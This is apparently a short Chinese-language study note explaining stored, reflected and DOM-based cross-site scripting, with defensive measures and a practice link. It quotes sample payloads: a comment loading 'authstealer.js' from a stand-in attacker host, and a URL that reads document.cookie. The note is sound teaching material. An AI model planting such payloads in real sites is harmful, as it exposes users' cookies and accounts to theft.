# XSS
XSS(Cross-Site- Scripting)跨站脚本攻击
> 具备窃取cookie的能力

> 本质：**信任网页A -> 不知情跳转 -> 未知网页B -> 恶意操作 -> 窃取A站的用户信息**
## 存储型XSS(持久化攻击)
危害性最大，恶意脚本直接注入应用。
### 示例
1. 攻击者发现网站漏洞(一般是评论区等内容填写的位置)
2. 通过漏洞插入插入恶意脚本
```
这是评论<script src=”http://hackersite.com/authstealer.js”></script>
```
3. 每次用户访问就会执行该恶意脚本，用户信息被窃取
> 和反射型的区别主要是存储型的恶意代码存在数据库里，反射型的恶意代码可能存储在URL里
## 反射型XSS(非持久化攻击)
将恶意脚本嵌入应用中，用户访问才会激活。
### 示例
1. 访问正常链接
```
http://normal.com?name=louis
```
2. 访问含有恶意代码的链接
```
http://normal.com?name=<script>alert(document.cookie)</script>
```
## DOM based XSS
> 区分DOM based XSS不再是通过存储位置不同来区分
就是通过JS将恶意脚本输出到HTML上，一般是通过`document.write`或者`innerHTML`
## 措施
1. 设置httpOnly，防止客户端通过`document.cookie`访问cookie
2. 不使用`eval`和`new Function`执行未知代码
3. 对输入内容进行转译

## 训练
[XSS训练](https://alf.nu/alert1)

# 参考
[XSS](https://www.imperva.com/learn/application-security/cross-site-scripting-xss-attacks/)